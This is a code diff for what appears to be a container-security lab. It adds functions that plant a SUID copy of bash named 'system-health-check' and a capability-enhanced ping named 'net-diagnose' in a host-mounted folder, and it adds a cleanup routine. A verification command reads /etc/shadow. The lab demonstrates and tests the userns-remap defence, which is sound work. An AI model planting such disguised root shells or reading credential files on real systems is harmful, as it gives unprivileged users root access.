@@ -445,6 +445,119 @@ export async function cleanup(): Promise<LabResponse> {
 	return runShell("pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true");
 }
 
+const suidTrapName = 'system-health-check';
+const setcapTrapName = 'net-diagnose';
+const suidTrapPath = join(uploadDir, suidTrapName);
+const setcapTrapPath = join(uploadDir, setcapTrapName);
+
+export function plantSuidTrap(): LabResponse {
+	mkdirSync(uploadDir, { recursive: true });
+
+	try {
+		// Copy /bin/bash (or fallback to /bin/sh) and set SUID bit
+		const sourceBinary = existsSync('/bin/bash') ? '/bin/bash' : '/bin/sh';
+		execFileSync('cp', [sourceBinary, suidTrapPath]);
+		execFileSync('chmod', ['4755', suidTrapPath]);
+	} catch (error) {
+		return {
+			ok: false,
+			scenario: 'SUID LPE trap',
+			error: error instanceof Error ? error.message : String(error)
+		};
+	}
+
+	const stat = commandSync(`stat -c '%A %a %u:%g %U:%G %n' ${shellQuote(suidTrapPath)}`);
+	const uidMap = readFirst(['/proc/self/uid_map']);
+	const isUsernsActive = uidMap.trim().split(/\s+/).slice(0, 3).join(' ') !== '0 0 4294967295';
+
+	return {
+		ok: true,
+		scenario: 'SUID LPE trap planted',
+		trap_path: suidTrapPath,
+		host_path: `~/apps/dokuru-lab/uploads/${suidTrapName}`,
+		verification_cmd: `./${suidTrapName} -p -c 'id; whoami; cat /etc/shadow | head -3'`,
+		stat,
+		uid_map: uidMap,
+		userns_remap_active: isUsernsActive,
+		expected_impact: isUsernsActive
+			? 'SUID bit owned by remapped UID — running this as unprivileged host user gives no privilege elevation'
+			: 'DANGEROUS — SUID bit owned by host root — running this as unprivileged host user yields full root shell',
+		recommended_next: isUsernsActive
+			? 'Demo the neutralized attack: execute ./system-health-check -p from host — euid stays unprivileged'
+			: 'Demo the lethal attack: execute ./system-health-check -p from host — euid becomes 0(root)',
+		runtime: runtimeEvidence()
+	};
+}
+
+export function plantSetcapTrap(): LabResponse {
+	mkdirSync(uploadDir, { recursive: true });
+
+	const sourceBinary = existsSync('/bin/ping') ? '/bin/ping' : '/usr/bin/ping';
+	if (!existsSync(sourceBinary)) {
+		return {
+			ok: false,
+			scenario: 'setcap capability trap',
+			error: 'source binary (/bin/ping or /usr/bin/ping) not found'
+		};
+	}
+
+	let setcapError: string | null = null;
+	try {
+		execFileSync('cp', [sourceBinary, setcapTrapPath]);
+		// Attempt to grant network admin + raw + bind capabilities
+		execFileSync('setcap', ['cap_net_admin,cap_net_raw,cap_net_bind_service+ep', setcapTrapPath]);
+	} catch (error) {
+		setcapError = error instanceof Error ? error.message : String(error);
+	}
+
+	const stat = commandSync(`stat -c '%A %a %u:%g %U:%G %n' ${shellQuote(setcapTrapPath)}`);
+	const capabilities = commandSync(`getcap ${shellQuote(setcapTrapPath)} 2>&1 || echo no-caps-present`);
+	const uidMap = readFirst(['/proc/self/uid_map']);
+	const isUsernsActive = uidMap.trim().split(/\s+/).slice(0, 3).join(' ') !== '0 0 4294967295';
+
+	return {
+		ok: setcapError === null,
+		scenario: 'setcap capability trap',
+		trap_path: setcapTrapPath,
+		host_path: `~/apps/dokuru-lab/uploads/${setcapTrapName}`,
+		stat,
+		capabilities,
+		uid_map: uidMap,
+		userns_remap_active: isUsernsActive,
+		setcap_error: setcapError,
+		expected_impact: setcapError
+			? 'setcap FAILED — kernel rejected capability assignment (likely userns-remap active, container lacks CAP_SETFCAP in init_user_ns)'
+			: 'DANGEROUS — binary now carries network admin + raw socket capabilities as host root. Any host user executing it inherits those powers.',
+		recommended_next: setcapError
+			? 'Demo the neutralized attack: show that attacker cannot elevate file capabilities anymore'
+			: 'Demo the lethal primitive: any unprivileged host user running ./net-diagnose gains network admin powers',
+		runtime: runtimeEvidence()
+	};
+}
+
+export function cleanupExploitTraps(): LabResponse {
+	const removed: string[] = [];
+	const errors: string[] = [];
+
+	for (const path of [suidTrapPath, setcapTrapPath]) {
+		if (!existsSync(path)) continue;
+		try {
+			unlinkSync(path);
+			removed.push(path);
+		} catch (error) {
+			errors.push(`${path}: ${error instanceof Error ? error.message : String(error)}`);
+		}
+	}
+
+	return {
+		ok: errors.length === 0,
+		scenario: 'exploit trap cleanup',
+		removed,
+		errors,
+		runtime: runtimeEvidence()
+	};
+}
+
 export function health(): LabResponse {
 	ensureDataDir();
 	const probePath = join(dataDir, 'health-probe.txt');
